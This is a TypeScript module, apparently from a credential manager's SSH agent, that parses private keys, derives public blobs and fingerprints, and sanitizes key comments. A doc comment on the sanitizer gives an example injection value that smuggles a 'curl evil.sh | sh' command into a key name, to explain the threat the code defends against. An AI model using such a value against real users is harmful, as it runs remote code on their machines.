import { describeError } from './describeError';
import * as crypto from 'node:crypto';
import { ByteReader, encodeString } from './sshAgentProtocol';

/**
 * Reading a stored private key into something that can sign, and deriving the public blob the
 * agent protocol advertises.
 *
 * <p>Node's `crypto.createPrivateKey` reads PKCS#8 and PKCS#1 PEM, and — since Node 12 — the
 * `openssh-key-v1` format `ssh-keygen` writes by default. So the private half needs no
 * hand-rolled parser. What Node will NOT give us is the SSH wire-format public key, which is
 * what an agent must publish, so that is derived here from the key's own numbers.</p>
 *
 * <p><b>A passphrase-protected key is refused, with the reason.</b> OpenSSH encrypts its own
 * format with bcrypt_pbkdf, which Node does not implement, and a credential manager guessing at
 * a KDF is the wrong kind of clever. The vault already encrypts the key at rest, so the honest
 * instruction is to store it unencrypted here — and the refusal says exactly that instead of
 * failing as "unsupported key".</p>
 *
 * <p>Pure and `vscode`-free.</p>
 */

export type SshKeyAlgorithm = 'ssh-ed25519' | 'ssh-rsa' | 'ecdsa-sha2-nistp256' | 'ecdsa-sha2-nistp384' | 'ecdsa-sha2-nistp521';

export interface ParsedSshKey {
  key: crypto.KeyObject;
  algorithm: SshKeyAlgorithm;
  /** SSH wire format public key — what the agent advertises and a client matches against. */
  publicBlob: Buffer;
  /** `ssh-ed25519 AAAA… comment` — the authorized_keys line. The comment is sanitized. */
  publicLine: string;
  /**
   * `ssh-ed25519 AAAA…` with NO comment — the form that goes into a shell command.
   *
   * <p>Separate from `publicLine` on purpose: a comment is free text from an entity name, and
   * the Git signing config interpolates the key into a command a person pastes into a shell.
   * Base64 and a fixed algorithm name cannot carry a shell metacharacter; a comment can.</p>
   */
  publicKeyOnly: string;
  /** `SHA256:…`, as `ssh-keygen -lf` prints it. */
  fingerprint: string;
}

export type KeyParseResult =
  | { ok: true; key: ParsedSshKey }
  | { ok: false; reason: string };

const CURVE_NAMES: Record<string, SshKeyAlgorithm> = {
  prime256v1: 'ecdsa-sha2-nistp256',
  secp384r1: 'ecdsa-sha2-nistp384',
  secp521r1: 'ecdsa-sha2-nistp521',
};

const CURVE_IDENTIFIERS: Record<SshKeyAlgorithm, string> = {
  'ecdsa-sha2-nistp256': 'nistp256',
  'ecdsa-sha2-nistp384': 'nistp384',
  'ecdsa-sha2-nistp521': 'nistp521',
  'ssh-ed25519': '',
  'ssh-rsa': '',
};

/** An SSH mpint: two's-complement, so a leading high bit gets a zero byte in front. */
function encodeMpint(value: Buffer): Buffer {
  let start = 0;
  while (start < value.length - 1 && value[start] === 0) {
    start += 1;
  }
  const trimmed = value.subarray(start);
  return encodeString(trimmed[0] & 0x80 ? Buffer.concat([Buffer.from([0]), trimmed]) : trimmed);
}

export function isEncryptedOpenSsh(text: string): boolean {
  if (!text.includes('OPENSSH PRIVATE KEY')) {
    return false;
  }
  // The header of an unencrypted openssh-key-v1 names the cipher "none"; anything else is
  // encrypted. Decoding just the first block is enough to read it.
  const body = text
    .replace(/-----[^-]+-----/g, '')
    .replace(/\s+/g, '');
  try {
    const raw = Buffer.from(body, 'base64');
    const reader = new ByteReader(raw.subarray('openssh-key-v1\0'.length));
    return reader.readString()?.toString('utf8') !== 'none';
  } catch {
    return false;
  }
}

interface PublicJwk {
  n?: string;
  e?: string;
  x?: string;
  y?: string;
}

function jwkBytes(value: string | undefined): Buffer {
  return Buffer.from(value ?? '', 'base64url');
}

/** An EC public blob: the curve name and the uncompressed point `0x04 || X || Y`. */
function ecPublicBlob(algorithm: SshKeyAlgorithm, jwk: PublicJwk): Buffer | undefined {
  const x = jwkBytes(jwk.x);
  const y = jwkBytes(jwk.y);
  if (x.length === 0 || y.length === 0) {
    return undefined;
  }
  const point = Buffer.concat([Buffer.from([0x04]), x, y]);
  return Buffer.concat([
    encodeString(algorithm),
    encodeString(CURVE_IDENTIFIERS[algorithm]),
    encodeString(point),
  ]);
}

function publicBlobFor(key: crypto.KeyObject, algorithm: SshKeyAlgorithm): Buffer | undefined {
  const jwk = crypto.createPublicKey(key).export({ format: 'jwk' }) as PublicJwk;
  if (algorithm === 'ssh-ed25519') {
    return Buffer.concat([encodeString(algorithm), encodeString(jwkBytes(jwk.x))]);
  }
  if (algorithm === 'ssh-rsa') {
    // The SSH order is exponent then modulus, which is the reverse of how they are usually read.
    return Buffer.concat([encodeString(algorithm), encodeMpint(jwkBytes(jwk.e)), encodeMpint(jwkBytes(jwk.n))]);
  }
  return ecPublicBlob(algorithm, jwk);
}

const SIMPLE_ALGORITHMS: Record<string, SshKeyAlgorithm> = {
  ed25519: 'ssh-ed25519',
  rsa: 'ssh-rsa',
};

function curveAlgorithm(key: crypto.KeyObject): SshKeyAlgorithm | undefined {
  const curve = key.asymmetricKeyDetails?.namedCurve;
  return curve === undefined ? undefined : CURVE_NAMES[curve];
}

function algorithmOf(key: crypto.KeyObject): SshKeyAlgorithm | undefined {
  const type = key.asymmetricKeyType ?? '';
  if (type === 'ec') {
    return curveAlgorithm(key);
  }
  return SIMPLE_ALGORITHMS[type];
}

/** `SHA256:base64(sha256(blob))`, without padding — exactly what `ssh-keygen -lf` shows. */
export function keyFingerprintOf(publicBlob: Buffer): string {
  const digest = crypto.createHash('sha256').update(publicBlob).digest('base64').replace(/=+$/, '');
  return `SHA256:${digest}`;
}

const PASSPHRASE_REASON =
  'the key is protected by its own passphrase, which this agent cannot open (OpenSSH uses ' +
  'bcrypt_pbkdf, and Node has no implementation of it). Store the key without a passphrase — ' +
  'the vault already encrypts it at rest — or decrypt it with: ssh-keygen -p -N "" -f <file>';

/** The parsed key, or the reason the crypto layer would not read it. */
function readPrivateKey(text: string): { ok: true; key: crypto.KeyObject } | { ok: false; reason: string } {
  if (isEncryptedOpenSsh(text)) {
    return { ok: false, reason: PASSPHRASE_REASON };
  }
  try {
    return { ok: true, key: crypto.createPrivateKey(text) };
  } catch (error) {
    return { ok: false, reason: `the key could not be read: ${describeError(error)}` };
  }
}

/** Read a stored private key. The result carries the reason on failure — it reaches the user. */
export function parseSshPrivateKey(content: string, comment = ''): KeyParseResult {
  const text = content.trim();
  if (text.length === 0) {
    return { ok: false, reason: 'the stored key is empty' };
  }
  const read = readPrivateKey(text);
  return read.ok ? describeKey(read.key, comment) : read;
}

function unsupportedReason(key: crypto.KeyObject): string {
  const named = key.asymmetricKeyType ?? 'that';
  return `${named} keys are not supported by this agent (Ed25519, RSA and ECDSA P-256/384/521 are)`;
}

/** Everything the agent publishes about a key it can serve, or why it cannot serve this one. */
function describeKey(key: crypto.KeyObject, comment: string): KeyParseResult {
  const algorithm = algorithmOf(key);
  if (algorithm === undefined) {
    return { ok: false, reason: unsupportedReason(key) };
  }
  const publicBlob = publicBlobFor(key, algorithm);
  if (publicBlob === undefined) {
    return { ok: false, reason: 'the public half of the key could not be derived' };
  }
  return { ok: true, key: publishedKey(key, algorithm, publicBlob, comment) };
}

/**
 * An SSH key comment, reduced to what a comment is allowed to be.
 *
 * <p><b>This is a security boundary, not tidiness.</b> The comment is an ENTITY NAME, and an
 * entity name can arrive from a CSV or JSON export somebody else wrote (`importFormats.ts`) or
 * from a shared item. `publicLine` ends up inside a `git config … "key::…"` line that
 * *Copy Git Signing Config* puts on the clipboard for a person to paste into a shell — so a name
 * like `srv" ; curl evil.sh | sh #` would run when they did exactly what the feature told them
 * to. Names are also written into `authorized_keys`, where a newline would forge a second entry.</p>
 *
 * <p>So: letters, digits, and the punctuation real key comments contain (`@ . _ - +`), spaces
 * collapsed, length capped. Everything else is dropped rather than escaped — escaping is
 * shell-specific and there is no shell here to be specific about.</p>
 */
export function sanitizeKeyComment(comment: string): string {
  return comment
    .replace(/[^A-Za-z0-9@._+-]+/g, ' ')
    .replace(/\s+/g, ' ')
    .trim()
    .slice(0, 64);
}

function publishedKey(
  key: crypto.KeyObject,
  algorithm: SshKeyAlgorithm,
  publicBlob: Buffer,
  comment: string,
): ParsedSshKey {
  const safe = sanitizeKeyComment(comment);
  const suffix = safe.length > 0 ? ` ${safe}` : '';
  return {
    key,
    algorithm,
    publicBlob,
    publicLine: `${algorithm} ${publicBlob.toString('base64')}${suffix}`,
    // The key WITHOUT its comment: what `user.signingkey` needs, and the only form that goes
    // near a shell command. Git does not want the comment, so it is not given the chance.
    publicKeyOnly: `${algorithm} ${publicBlob.toString('base64')}`,
    fingerprint: keyFingerprintOf(publicBlob),
  };
}
